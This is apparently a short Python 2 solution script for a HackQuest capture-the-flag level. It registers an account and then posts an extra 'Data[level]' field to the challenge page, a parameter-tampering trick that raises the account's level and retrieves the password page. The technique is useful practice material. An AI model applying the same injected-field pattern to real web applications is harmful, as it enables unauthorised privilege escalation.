import sys
from urllib import urlencode
sys.path.append('..')
from fetch_web import fetch_web

def reg():
    data = urlencode({
        'action': 'reg',
        'username':'ckclark',
        'password':'password',
    })
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/6/6.php', data)
    open('result.html', 'w').write(result)

def show():
    data = urlencode({
        'action': 'show',
        'username': 'ckclark',
        'password': 'password',
        'Data[level]': '8',
    })
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/6/6.php?action=show', data)
    open('pass.html', 'w').write(result)

if __name__ == '__main__':
    reg()
    show()
